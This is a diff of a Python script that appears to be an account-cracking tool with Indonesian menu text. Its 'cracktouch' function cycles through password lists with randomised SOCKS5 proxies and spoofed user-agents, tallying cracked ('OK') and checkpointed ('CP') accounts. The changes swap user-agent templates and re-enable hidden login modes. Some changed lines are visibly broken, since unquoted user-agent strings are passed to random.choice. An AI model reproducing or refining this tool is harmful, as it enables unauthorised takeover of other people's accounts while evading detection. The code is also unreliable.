@@ -65,13 +65,13 @@ for xd in range(10000):
 	ugen2.append(uaku)
 
 
-	aa='Mozilla/5.0 (SMART-TV; Linux'
+	aa='Mozilla/5.0 (BlackBerry; U; BlackBerry'
 	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Smart TV'
+	c='BlackBerry'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	e=random.randrange(1, 999)
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/'
+	g='AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546'
 	h=random.randrange(73,100)
 	i='0'
 	j=random.randrange(4200,4900)
@@ -80,7 +80,7 @@ for xd in range(10000):
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
 for x in range(10):
-	a='Mozilla/5.0 (Linux; NetCast'
+	a='Mobile Safari/535.8+'
 	b=random.randrange(100, 9999)
 	c=random.randrange(100, 9999)
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -631,9 +631,9 @@ def setting():
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
 	print('>> 1. Mobile (Rekomendasi)')
-#	print('>> 2. Mbasic ')
-#	print('>> 3. Touch  ')
-#	print('>> 4. Mtouch ')
+	print('>> 2. Mbasic ')
+	print('>> 3. Touch  ')
+	print('>> 4. Mtouch ')
 	print('')
 	hc = input('>> Pilih : ')
 	if hc in ['1','01']:
@@ -879,8 +879,8 @@ def cracktouch(idf,pwv):
 	fff = '%'
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua = random.choice(Mozilla/5.0 (SMART-TV; Linux 8; Smart TVN50J) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/74.0.4825.116 SamsungBrowser/1.1 tv Safari/538.1)
+	ua2 = random.choice(Mozilla/5.0 (BlackBerry; U; BlackBerry 9790; en-GB) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.528 Mobile Safari/534.11+)
 	ses = requests.Session()
 	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
